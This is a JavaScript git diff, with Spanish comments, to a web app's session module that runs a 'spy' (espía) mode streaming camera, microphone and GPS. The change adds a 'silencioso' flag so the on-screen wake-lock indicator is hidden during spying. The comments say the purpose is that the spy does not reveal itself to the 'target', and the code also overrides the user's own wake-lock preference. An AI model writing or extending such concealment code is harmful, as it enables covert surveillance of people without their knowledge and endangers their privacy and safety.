@@ -1481,18 +1481,19 @@ const Session = (() => {
       setTimeout(() => { try { chip.remove(); } catch(_){} }, 380);
     }, 3000);
   }
-  // [v2.13.90] Parámetro forzar para que el espía pueda activar el lock aún
-  // cuando el user tenga 'wh_wakelock=0' en localStorage. El espía necesita
-  // la pantalla activa para mantener cam/mic/GPS funcionando.
-  async function _activarWakeLock(forzar) {
+  // [v2.13.91] Parámetros:
+  //   forzar=true   → ignora preferencia 'wh_wakelock=0' (espía lo necesita sí o sí)
+  //   silencioso=true → no muestra el chip "🔆 Pantalla activa" (espía no delata al target)
+  async function _activarWakeLock(forzar, silencioso) {
     if (!('wakeLock' in navigator)) return;
     if (_wakeLockSentinel) return;
     if (!forzar && localStorage.getItem('wh_wakelock') === '0') return;
     try {
       _wakeLockSentinel = await navigator.wakeLock.request('screen');
-      _whWakeRenderChip(true);
+      if (!silencioso) _whWakeRenderChip(true);
       _wakeLockSentinel.addEventListener('release', () => {
         _wakeLockSentinel = null;
+        // _whWakeRenderChip(false) es idempotente: no-op si no hay chip
         _whWakeRenderChip(false);
       });
     } catch(e) { /* dispositivo no soporta o sin user gesture */ }
@@ -1508,7 +1509,7 @@ const Session = (() => {
   document.addEventListener('visibilitychange', () => {
     if (document.visibilityState !== 'visible') return;
     if (sesionActual) _activarWakeLock();
-    else if (window._espiaCliWH) _activarWakeLock(true); // espía: forzar
+    else if (window._espiaCliWH) _activarWakeLock(true, true); // espía: forzar + silencioso
   });
 
   function lockTecla(d) {
@@ -2403,7 +2404,7 @@ const Session = (() => {
         // [v2.13.90] Forzar Wake Lock al iniciar espía — pantalla activa es
         // requisito para mantener cam/mic/GPS. Saltea preferencia wh_wakelock=0
         // porque la espía la necesita sí o sí mientras está activa.
-        try { _activarWakeLock(true); } catch(_){}
+        try { _activarWakeLock(true, true); } catch(_){}
         // [v2.13.80] Handshake auth + config — paralelo para latencia mínima.
         // El device prueba su identidad (deviceId coincide con la sesión) y
         // a cambio recibe token HMAC + lista de iceServers (TURN si disponible).
@@ -2516,7 +2517,7 @@ const Session = (() => {
               console.log('[espia WH visibility] visible · reanimar');
               ref._ultimaVisible = Date.now();
               // [v2.13.90] Re-forzar wake lock (browser lo libera al hidden)
-              try { _activarWakeLock(true); } catch(_){}
+              try { _activarWakeLock(true, true); } catch(_){}
               // restartIce solo si pc NO está cerrado y está en estado que admite reanimar
               if (pcAhora.connectionState !== 'closed') {
                 let estICE = '';
